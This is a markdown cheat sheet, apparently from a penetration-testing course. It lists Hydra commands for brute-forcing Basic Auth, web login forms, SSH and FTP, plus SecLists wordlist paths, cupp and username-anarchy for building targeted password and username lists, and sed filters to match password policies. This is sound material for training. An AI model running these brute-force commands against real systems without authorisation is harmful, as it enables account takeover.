# Hydra

| **Command**   | **Description**   |
| --------------|-------------------|
| `hydra -h` | hydra help |
| `hydra -C wordlist.txt SERVER_IP -s PORT http-get /` | Basic Auth Brute Force - Combined Wordlist |
| `hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /` | Basic Auth Brute Force - User/Pass Wordlists |
| `hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"` | Login Form Brute Force - Static User, Pass Wordlist |
| `hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4` | SSH Brute Force - User/Pass Wordlists |
| `hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1` | FTP Brute Force - Static User, Pass Wordlist |

# Wordlists

| **Command**   | **Description**   |
| --------------|-------------------|
| `/opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt` | Default Passwords Wordlist |
| `/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt` | Common Passwords Wordlist |
| `/opt/useful/SecLists/Usernames/Names/names.txt` | Common Names Wordlist |

# Misc

| **Command**   | **Description**   |
| --------------|-------------------|
| `cupp -i` | Creating Custom Password Wordlist |
| `sed -ri '/^.{,7}$/d' william.txt` | Remove Passwords Shorter Than 8 |
| ```sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt``` | Remove Passwords With No Special Chars |
| `sed -ri '/[0-9]+/!d' william.txt` | Remove Passwords With No Numbers |
| `./username-anarchy Bill Gates > bill.txt` | Generate Usernames List |
| `ssh b.gates@SERVER_IP -p PORT` | SSH to Server |
| `ftp 127.0.0.1` | FTP to Server |
| `su - user` | Switch to User |